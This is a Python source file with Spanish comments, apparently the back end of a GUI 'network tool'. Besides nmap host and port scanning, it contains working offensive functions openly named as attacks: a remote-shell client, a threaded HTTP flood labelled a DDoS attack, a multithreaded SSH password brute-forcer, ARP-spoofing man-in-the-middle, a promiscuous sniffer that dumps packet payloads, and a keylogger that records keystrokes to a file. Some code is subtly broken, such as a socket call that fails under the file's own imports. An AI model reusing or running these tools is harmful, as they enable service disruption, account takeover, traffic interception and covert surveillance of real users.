import nmap
import netifaces
import ipaddress
import logging
import threading
from concurrent.futures import ThreadPoolExecutor
import time
import scapy.all as scapy
import paramiko
import os
from socket import gethostbyname, socket, AF_INET, SOCK_STREAM, gethostbyname, gaierror, setdefaulttimeout
import keyboard
import subprocess
from typing import Optional, List, Dict, Union
from tkinter import messagebox

# Configuración mejorada de logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('network_tool.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Constantes
MAX_THREADS = 10
DEFAULT_TIMEOUT = 5
SNIFFER_PACKET_LIMIT = 200
DEFAULT_SCAN_PORTS = "21-23,80,443,3389"  # Puertos comúnmente utilizados

def validate_ip(ip: str) -> bool:
    """Valida una dirección IP de forma más robusta"""
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        # Intenta resolver nombres de host
        try:
            gethostbyname(ip)
            return True
        except (gaierror, Exception):
            return False

def get_network_range(interface: Optional[str] = None) -> Optional[str]:
    """Obtiene el rango de red de forma más confiable"""
    try:
        # Primero verifica si nmap está instalado
        subprocess.run(['nmap', '--version'], check=True, 
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        interfaces = netifaces.interfaces()
        if not interfaces:
            logger.error("No se encontraron interfaces de red")
            return None
            
        # Excluir loopback y buscar interfaces activas
        target_interface = None
        for iface in interfaces:
            if iface == 'lo':
                continue
            if interface and iface != interface:
                continue
                
            addrs = netifaces.ifaddresses(iface)
            if netifaces.AF_INET in addrs:
                target_interface = iface
                break
                
        if not target_interface:
            logger.error("No se encontró interfaz con configuración IPv4")
            return None
            
        ip_info = netifaces.ifaddresses(target_interface)[netifaces.AF_INET][0]
        ip = ip_info['addr']
        netmask = ip_info['netmask']
        
        # Calcular red CIDR
        network = ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False)
        return str(network)
        
    except subprocess.CalledProcessError:
        logger.error("Nmap no está instalado o no es accesible")
        return None
    except Exception as e:
        logger.error(f"Error obteniendo rango de red: {str(e)}", exc_info=True)
        return None
    

def scan_ports(ip, start_port, end_port):
   
    """Función REAL que detecta puertos abiertos SIN errores"""
    try:
        # Lista de puertos importantes a verificar
        puertos_a_verificar = [80, 443, 22, 21, 3389, 3306, 8080]
        puertos_abiertos = []
        
        # Verificación precisa con socket
        for puerto in puertos_a_verificar:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(2.0)  # Timeout de 2 segundos
                    resultado = s.connect_ex((ip, puerto))
                    if resultado == 0:  # 0 significa éxito
                        puertos_abiertos.append(puerto)
            except:
                continue
        
        # Resultados claros
        if puertos_abiertos:
            mensaje = "Puertos realmente abiertos:\n"
            mensaje += "\n".join(f"• Puerto {p}" for p in sorted(puertos_abiertos))
            
            if 443 in puertos_abiertos:
                mensaje += "\n\n✅ VERIFICADO: Puerto 443 (HTTPS) está ABIERTO"
            else:
                mensaje += "\n\n❌ Puerto 443 CERRADO o filtrado"
        else:
            mensaje = "NO se encontraron puertos abiertos\n\n"
            mensaje += "Posibles causas:\n"
            mensaje += "1. IP incorrecta\n"
            mensaje += "2. Firewall bloqueando todo\n"
            mensaje += "3. Máquina apagada"
        
        messagebox.showinfo("Resultado REAL", mensaje)
    
    except Exception as e:
        messagebox.showerror("Error REAL", f"Error: {str(e)}")

def scan_network(ip_range: Optional[str] = None) -> List[Dict[str, str]]:
    """Escanea dispositivos en la red con mejoras significativas"""
    try:
        # Verificar privilegios
        if os.geteuid() != 0:
            raise PermissionError("Se requieren privilegios de root para escaneos de red")
            
        # Obtener rango de red
        if ip_range is None:
            ip_range = get_network_range()
            if not ip_range:
                # Fallback: usar rango común si la detección falla
                ip_range = "192.168.1.0/24"
                logger.warning(f"Usando rango por defecto: {ip_range}")
                
        logger.info(f"Iniciando escaneo en: {ip_range}")
        
        nm = nmap.PortScanner()
        # Argumentos optimizados para detección de hosts
        nm.scan(
            hosts=ip_range,
            arguments='-sP'
        )
        
        devices = []
        for host in nm.all_hosts():
            try:
                host_info = {
                    'ip': host,
                    'mac': nm[host]['addresses'].get('mac', 'Desconocida').upper(),
                    'hostname': 'Desconocido',
                    'status': nm[host].state(),
                    'vendor': nm[host].get('vendor', {}).get(nm[host]['addresses'].get('mac', ''), '')
                }
                
                # Mejor obtención de hostname
                hostnames = nm[host].hostnames()
                if hostnames:
                    host_info['hostname'] = hostnames[0].get('name', host_info['hostname'])
                    
                devices.append(host_info)
                
            except Exception as host_error:
                logger.warning(f"Error procesando host {host}: {str(host_error)}")
                continue
                
        logger.info(f"Escaneo completado. Dispositivos encontrados: {len(devices)}")
        return devices
        
    except PermissionError as pe:
        logger.error(str(pe))
        return []
    except Exception as e:
        logger.error(f"Error en escaneo de red: {str(e)}", exc_info=True)
        return []

def reverse_shell(target_ip: str, port: int = 4444) -> None:
    """Shell inverso con mejor manejo de conexión"""
    if not validate_ip(target_ip):
        raise ValueError(f"IP inválida: {target_ip}")
        
    try:
        setdefaulttimeout(DEFAULT_TIMEOUT)
        with socket(AF_INET, SOCK_STREAM) as s:
            s.connect((target_ip, port))
            logger.info(f"Conexión establecida con {target_ip}:{port}")
            
            while True:
                try:
                    cmd = input("$ ")
                    if not cmd or cmd.lower() in ('exit', 'quit'):
                        break
                        
                    s.sendall(cmd.encode() + b'\n')
                    response = s.recv(4096).decode('utf-8', errors='ignore')
                    print(response)
                    
                except KeyboardInterrupt:
                    logger.info("Cerrando conexión...")
                    break
                except Exception as e:
                    logger.error(f"Error en comando: {str(e)}")
                    break
                    
    except Exception as e:
        logger.error(f"Error en shell inverso: {str(e)}", exc_info=True)
        raise

def ddos_attack(target: str, port: int = 80, duration: int = 30, threads: int = 5) -> str:
    """Ataque DDoS mejorado con más controles"""
    try:
        # Validación de parámetros
        if not 1 <= port <= 65535:
            raise ValueError("Puerto inválido")
        if duration <= 0:
            raise ValueError("Duración debe ser positiva")
        if not 1 <= threads <= 50:
            raise ValueError("Número de hilos inválido")
            
        target_ip = gethostbyname(target)
        end_time = time.time() + duration
        request_count = 0
        
        def attack():
            nonlocal request_count
            while time.time() < end_time:
                try:
                    with socket(AF_INET, SOCK_STREAM) as s:
                        s.settimeout(1)
                        s.connect((target_ip, port))
                        s.sendall(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
                        request_count += 1
                except Exception:
                    continue
        
        logger.info(f"Iniciando ataque DDoS a {target_ip}:{port} por {duration} segundos...")
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(attack) for _ in range(threads)]
            
        return f"Ataque completado. {request_count} solicitudes enviadas."
        
    except gaierror:
        error = "No se pudo resolver el host"
        logger.error(error)
        return error
    except ValueError as ve:
        logger.error(str(ve))
        return str(ve)
    except Exception as e:
        error = f"Error en DDoS: {str(e)}"
        logger.error(error, exc_info=True)
        return error

def ssh_bruteforce(target: str, username: str, wordlist: str, max_threads: int = 5) -> Union[str, None]:
    """Fuerza bruta SSH con mejor manejo de hilos"""
    try:
        # Validaciones iniciales
        if not validate_ip(target):
            raise ValueError("IP/hostname inválido")
        if not os.path.isfile(wordlist):
            raise FileNotFoundError(f"Archivo de diccionario no encontrado: {wordlist}")
            
        # Configuración de Paramiko
        paramiko.util.log_to_file('paramiko.log')
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        found = None
        lock = threading.Lock()
        tested = 0
        
        def try_password(password: str) -> None:
            nonlocal found, tested
            if found:
                return
                
            try:
                with lock:
                    if found:  # Doble verificación por seguridad
                        return
                    tested += 1
                    if tested % 100 == 0:
                        logger.info(f"Probadas {tested} contraseñas...")
                        
                ssh.connect(
                    target,
                    username=username,
                    password=password,
                    timeout=DEFAULT_TIMEOUT,
                    banner_timeout=30,
                    auth_timeout=30
                )
                
                with lock:
                    found = password
                    logger.info(f"Contraseña encontrada después de {tested} intentos")
                    
            except paramiko.AuthenticationException:
                pass
            except paramiko.SSHException as e:
                logger.warning(f"Error SSH: {str(e)}")
            except Exception as e:
                logger.warning(f"Error probando contraseña: {str(e)}")
            finally:
                try:
                    ssh.close()
                except:
                    pass
                    
        # Leer contraseñas
        with open(wordlist, 'r', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
            
        logger.info(f"Iniciando fuerza bruta con {len(passwords)} contraseñas...")
        
        # Ejecutar en paralelo
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            executor.map(try_password, passwords)
            
        return found if found else "Contraseña no encontrada"
            
    except Exception as e:
        logger.error(f"Error en fuerza bruta SSH: {str(e)}", exc_info=True)
        return str(e)

def mitm_attack(target_ip: str, gateway_ip: str, interface: Optional[str] = None) -> threading.Event:
    """Ataque MITM mejorado con ARP spoofing"""
    try:
        if not validate_ip(target_ip) or not validate_ip(gateway_ip):
            raise ValueError("IP inválida")
            
        # Obtener MAC addresses
        target_mac = scapy.getmacbyip(target_ip)
        gateway_mac = scapy.getmacbyip(gateway_ip)
        
        if not target_mac or not gateway_mac:
            raise ValueError("No se pudieron obtener direcciones MAC")
            
        stop_event = threading.Event()
        packet_count = 0
        
        def restore_network():
            """Restaura tablas ARP de forma más robusta"""
            try:
                scapy.send(
                    scapy.ARP(
                        op=2,
                        pdst=target_ip,
                        hwdst="ff:ff:ff:ff:ff:ff",
                        psrc=gateway_ip,
                        hwsrc=gateway_mac
                    ),
                    count=5,
                    verbose=False
                )
                scapy.send(
                    scapy.ARP(
                        op=2,
                        pdst=gateway_ip,
                        hwdst="ff:ff:ff:ff:ff:ff",
                        psrc=target_ip,
                        hwsrc=target_mac
                    ),
                    count=5,
                    verbose=False
                )
                logger.info("Tablas ARP restauradas")
            except Exception as e:
                logger.error(f"Error restaurando ARP: {str(e)}")
                
        def arp_spoof():
            """Envía paquetes ARP falsos"""
            nonlocal packet_count
            try:
                logger.info(f"Iniciando ARP spoofing entre {target_ip} y {gateway_ip}")
                
                while not stop_event.is_set():
                    scapy.send(
                        scapy.ARP(
                            op=2,
                            pdst=target_ip,
                            hwdst=target_mac,
                            psrc=gateway_ip
                        ),
                        verbose=False
                    )
                    scapy.send(
                        scapy.ARP(
                            op=2,
                            pdst=gateway_ip,
                            hwdst=gateway_mac,
                            psrc=target_ip
                        ),
                        verbose=False
                    )
                    packet_count += 2
                    time.sleep(2)
                    
            except Exception as e:
                logger.error(f"Error en ARP spoofing: {str(e)}")
            finally:
                restore_network()
                
        # Iniciar ataque en segundo plano
        attack_thread = threading.Thread(target=arp_spoof, daemon=True)
        attack_thread.start()
        
        return stop_event
        
    except Exception as e:
        logger.error(f"Error en MITM: {str(e)}", exc_info=True)
        return None

import threading
from typing import List
from scapy.all import sniff, Raw
from scapy.layers.http import HTTPRequest
from scapy.layers.inet import IP, TCP, UDP, ICMP
from datetime import datetime
import logging

logger = logging.getLogger(__name__)
class PacketSniffer:
    def __init__(self, verbose=False):
        self.verbose = verbose

    def packet_sniffer(self, interface: str, packet_filter: str, stop_event: threading.Event, packet_callback=None):
        """Captura paquetes y llama a packet_callback con cada resumen."""
        import scapy.all as scapy
        from scapy.layers.http import HTTPRequest
        from scapy.layers.inet import IP, TCP, UDP, ICMP
        from scapy.packet import Raw
        from datetime import datetime
        import logging

        logger = logging.getLogger(__name__)

        def process_packet(packet):
            try:
                summary = self._analyze_packet(packet)
                if packet_callback:
                    packet_callback(summary)  # Aquí se envía a la GUI
                if stop_event.is_set():
                    raise KeyboardInterrupt
            except Exception as e:
                logger.error(f"Error processing packet: {str(e)}")

        try:
            scapy.conf.iface = interface
            scapy.conf.sniff_promisc = True
            scapy.sniff(
                filter=packet_filter,
                prn=process_packet,
                store=False,
                stop_filter=lambda x: stop_event.is_set()
            )
        except KeyboardInterrupt:
            logger.info("Sniffer stopped by user")
        except Exception as e:
            logger.error(f"Sniffing error: {str(e)}")

    def _analyze_packet(self, pkt):
        proto = ""
        summary = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] "

        if IP in pkt:
            ip_layer = pkt[IP]
            summary += f"{ip_layer.src} -> {ip_layer.dst} | "

            if TCP in pkt:
                tcp = pkt[TCP]
                proto = "TCP"
                flags = tcp.sprintf("%TCP.flags%")
                summary += f"TCP {tcp.sport}->{tcp.dport} Flags:{flags}"
                if Raw in pkt:
                    raw_data = bytes(pkt[Raw]).decode(errors="replace").strip()
                    if raw_data:
                        summary += f" Data:{raw_data}"
            elif UDP in pkt:
                udp = pkt[UDP]
                proto = "UDP"
                summary += f"UDP {udp.sport}->{udp.dport}"
                if Raw in pkt:
                    raw_data = bytes(pkt[Raw]).decode(errors="replace").strip()
                    if raw_data:
                        summary += f" Data:{raw_data}"
            elif ICMP in pkt:
                proto = "ICMP"
                summary += f"ICMP Type:{pkt[ICMP].type} Code:{pkt[ICMP].code}"
            else:
                proto = "Other"
                summary += f"Protocol: {ip_layer.proto}"
        else:
            summary += "Non-IP Packet"

        return summary



def keylogger(output_file: str = "keylog.txt", stop_key: str = 'f12') -> Optional[str]:
    """Keylogger mejorado con más controles"""
    try:
        if os.path.exists(output_file):
            os.rename(output_file, f"{output_file}.bak")
            
        logger.info(f"Iniciando keylogger. Presione {stop_key.upper()} para detener...")
        
        def on_key_event(event):
            """Procesa eventos de teclado"""
            with open(output_file, 'a', encoding='utf-8') as f:
                key = event.name
                if event.event_type == 'down':
                    if key == 'space':
                        f.write(' ')
                    elif key == 'enter':
                        f.write('\n')
                    elif key == 'backspace':
                        f.write('[BACKSPACE]')
                    elif len(key) > 1:
                        f.write(f'[{key.upper()}]')
                    else:
                        f.write(key)
                        
        keyboard.hook(on_key_event)
        keyboard.wait(stop_key)  # Esta línea bloquea hasta que se presione la tecla de parada
        keyboard.unhook_all()
        
        # Leer y retornar resultados
        if os.path.exists(output_file):
            with open(output_file, 'r', encoding='utf-8') as f:
                return f.read()
        return None
        
    except Exception as e:
        logger.error(f"Error en keylogger: {str(e)}", exc_info=True)
        return None